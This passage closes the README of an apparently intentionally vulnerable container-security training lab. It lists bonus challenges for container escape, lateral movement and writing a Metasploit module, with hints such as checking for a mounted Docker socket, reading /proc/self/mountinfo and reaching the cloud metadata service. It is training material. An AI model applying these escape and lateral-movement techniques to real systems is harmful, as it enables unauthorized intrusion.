✅ **Least privilege** - Drop capabilities, read-only filesystems
✅ **Drift detection** - Alert on any container changes

---

## 🚀 Advanced Challenges (Bonus)

Want to go deeper? Try these advanced objectives:

### Challenge 1: Container Escape (200 points)
Can you escape the container and access the host system?

<details>
<summary>Hints</summary>

- Check if running in privileged mode
- Look for mounted Docker socket
- Research container escape techniques
- Try accessing `/proc/self/mountinfo`

</details>

### Challenge 2: Lateral Movement (150 points)
Access other containers or services in the same network.

<details>
<summary>Hints</summary>

- Scan the container network: `ip addr`
- Try to reach other containers or AWS metadata service
- Look for Kubernetes service accounts

</details>

### Challenge 3: Metasploit Module (100 points)
Create a custom Metasploit module to exploit the RCE vulnerability.

<details>
<summary>Hints</summary>

Research MSF module development for HTTP post exploits.

</details>

---

## 📖 Additional Resources

- [CrowdStrike Falcon Cloud Security](https://www.crowdstrike.com/products/cloud-security/)
- [Container Security Best Practices](https://www.crowdstrike.com/cybersecurity-101/cloud-security/container-security/)
- [OWASP Top 10 - Injection](https://owasp.org/www-project-top-ten/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)

---

**⚠️ Legal Disclaimer**

This is an intentionally vulnerable training application. Only perform these attacks in authorized lab environments. Unauthorized access to computer systems is illegal.

**© 2026 CrowdStrike Training Lab**
